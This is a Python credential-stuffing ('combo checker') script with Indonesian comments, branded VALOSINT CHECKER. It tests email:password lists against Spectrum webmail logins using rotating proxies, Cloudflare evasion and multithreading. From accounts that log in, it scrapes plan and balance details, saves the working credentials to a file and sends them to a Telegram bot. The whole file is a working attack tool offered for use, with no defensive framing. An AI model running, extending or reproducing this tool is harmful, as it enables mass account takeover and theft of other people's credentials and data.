import cloudscraper
import random
import time
import os
import sys
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from colorama import Fore, init, Style

# Inisialisasi warna terminal
init(autoreset=True)

class ValosintChecker:
    def __init__(self):
        self.valid_count = 0
        self.bad_count = 0
        self.scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
        )
        self.logo = f"""
{Fore.CYAN}    ____   ____  _     _       ____   ____  _  _  _____ 
{Fore.CYAN}   |    \\ |    || |   | |     |    | |    || || ||_   _|
{Fore.CYAN}   |  |  ||  |  || |   | |     |  |  ||  |  || || |  | |  
{Fore.CYAN}   |  |  ||  |  || |___| |___  |  |  ||  |  || || |  | |  
{Fore.CYAN}   |____/ |____||_____|_____| |____/ |____||_||_|  |_|  
{Fore.YELLOW}   =====================================================
{Fore.WHITE}   [+] NAME    : VALOSINT CHECKER ID (PREMIUM)
{Fore.WHITE}   [+] STATUS  : {Fore.GREEN}SATELLITE CONNECTED
{Fore.YELLOW}   =====================================================
        """

    def _get_time(self):
        return datetime.now().strftime("%H:%M:%S")

    def _save(self, folder, filename, data):
        if not os.path.exists(folder):
            os.makedirs(folder)
        with open(f"{folder}/{filename}", "a", encoding="utf-8") as f:
            f.write(data + "\n")

    def send_telegram(self, token, chat_id, message):
        if token and chat_id:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            try:
                requests.post(url, json={"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}, timeout=5)
            except:
                pass

    def get_capture(self, html):
        """Mencari data paket secara otomatis"""
        soup = BeautifulSoup(html, 'html.parser')
        capture = []
        # Mencari keyword umum di dashboard Spectrum
        for word in ["Plan", "Package", "Status", "Balance"]:
            find_text = soup.find(string=lambda t: word in t)
            if find_text:
                val = find_text.find_next().text.strip() if find_text.find_next() else "N/A"
                capture.append(f"{word}: {val}")
        return " | ".join(capture) if capture else "No Data"

    def check_account(self, credential, proxies, tg_token, tg_id):
        if ":" not in credential: return
        email, password = credential.split(":")
        
        # Animasi Satelit Berputar
        chars = ["|", "/", "-", "\\"]
        for char in chars:
            sys.stdout.write(f"\r{Fore.BLUE}[{char}] {Fore.WHITE}Satellite Scanning: {Fore.CYAN}{email}...")
            sys.stdout.flush()
            time.sleep(0.05)

        # Rotasi Proxy
        px = random.choice(proxies) if proxies else None
        px_map = {"http": f"http://{px}", "https": f"http://{px}"} if px else None
        
        try:
            # 1. Get Login Page untuk CSRF/Token
            target_url = "https://webmail.spectrum.net/index.php/mail/auth"
            res_get = self.scraper.get(target_url, proxies=px_map, timeout=15)
            soup = BeautifulSoup(res_get.text, 'html.parser')
            token = soup.find('input', {'type': 'hidden'})['value'] if soup.find('input', {'type': 'hidden'}) else ""

            # 2. Login Attempt
            payload = {'email': email, 'password': password, 'token': token, 'login': 'submit'}
            response = self.scraper.post(target_url, data=payload, proxies=px_map, timeout=20)

            ts = self._get_time()
            if response.status_code == 200 and ("dashboard" in response.url or "success" in response.text.lower()):
                capture_data = self.get_capture(response.text)
                
                # Hasil Live
                result_text = f"{email}:{password} | {capture_data}"
                print(f"\r{Fore.GREEN}[{ts}] [LIVE] {email} | {capture_data}")
                self._save("results", "live.txt", result_text)
                self.valid_count += 1
                
                # Kirim Telegram
                tg_msg = f"🚀 *VALOSINT HIT!*\n\n📧 *Email*: `{email}`\n🔑 *Pass*: `{password}`\n📊 *Info*: {capture_data}\n🕒 *Time*: {ts}"
                self.send_telegram(tg_token, tg_id, tg_msg)
            else:
                print(f"\r{Fore.RED}[{ts}] [DIE]  {email}")
                self.bad_count += 1

        except:
            print(f"\r{Fore.YELLOW}[{self._get_time()}] [ERROR] {email} (Proxy Down)")

    def start(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(self.logo)

        # INPUT INTERAKTIF
        print(f"{Fore.YELLOW}--- USER INPUT REQUIRED ---")
        combo_file = input(f"{Fore.WHITE}Masukkan File Combo (email:pass): ")
        proxy_file = input(f"{Fore.WHITE}Masukkan File Proxy (ip:port) : ")
        thread_count = int(input(f"{Fore.WHITE}Jumlah Thread (cth: 10)      : "))
        
        # INPUT TELEGRAM (Opsional)
        print(f"\n{Fore.YELLOW}--- TELEGRAM NOTIFY (Kosongkan jika tidak pakai) ---")
        tg_token = input(f"{Fore.WHITE}Token Telegram Bot: ")
        tg_id = input(f"{Fore.WHITE}Chat ID Telegram   : ")

        # Load Data
        if not os.path.exists(combo_file):
            print(f"{Fore.RED}\n[!] File Combo tidak ditemukan!")
            return
        
        accounts = [line.strip() for line in open(combo_file, 'r', encoding='utf-8') if ":" in line]
        proxies = [line.strip() for line in open(proxy_file, 'r', encoding='utf-8')] if os.path.exists(proxy_file) else []

        print(f"\n{Fore.GREEN}[+] Berhasil memuat {len(accounts)} akun.")
        print(f"{Fore.GREEN}[+] Berhasil memuat {len(proxies)} proxy.")
        print(f"{Fore.YELLOW}[*] Menghubungkan ke Satelit... Mohon tunggu.\n")
        time.sleep(2)

        # Proses Multi-threading
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            for acc in accounts:
                executor.submit(self.check_account, acc, proxies, tg_token, tg_id)

        print(f"\n{Fore.CYAN}=====================================================")
        print(f"{Fore.GREEN}VALID: {self.valid_count} | {Fore.RED}DIE: {self.bad_count}")
        print(f"{Fore.CYAN}Hasil lengkap disimpan di folder 'results/'")

if __name__ == "__main__":
    app = ValosintChecker()
    app.start()
